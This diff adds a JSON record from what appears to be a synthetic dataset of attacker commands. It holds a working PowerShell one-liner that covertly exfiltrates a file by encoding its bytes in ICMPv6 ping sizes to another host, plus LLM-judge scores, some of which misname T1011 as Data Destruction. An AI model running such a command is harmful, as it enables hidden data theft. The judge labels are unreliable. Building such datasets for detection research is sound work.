@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
+  "explanation": "Backgrounds ICMPv6 transmissions that encode bytes in payload size, reducing interactive artifacts while exfiltrating over ICMPv6 consistent with T1011.",
+  "rationale_steps": [
+    "Read file bytes.",
+    "Offset and embed each byte in ICMPv6 payload size.",
+    "Run pings as background jobs to minimize console output and attention."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-131755df",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignment, valid cmdlet usage, and correct pipeline structure.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements exfiltration over network protocol (T1011) by encoding file bytes into ICMP packet sizes, though it uses IPv6 ICMPv6 rather than the more common IPv4 ICMP for exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:28:46.740654Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignment, .NET method calls, cmdlet usage, and parameter syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration by encoding file bytes into ICMPv6 packet sizes, which is fundamentally misaligned with the T1011 Data Destruction technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:28:53.722874Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with correct separators, balanced quoting, and valid Test-Connection parameters and expressions.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements ICMPv6-based exfiltration by encoding file bytes into ping payload sizes (plausible), but it does not perform the provided Data Destruction technique and relies on a link\u2011local target with one background job per byte, reducing realism.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T01:30:37.522070Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
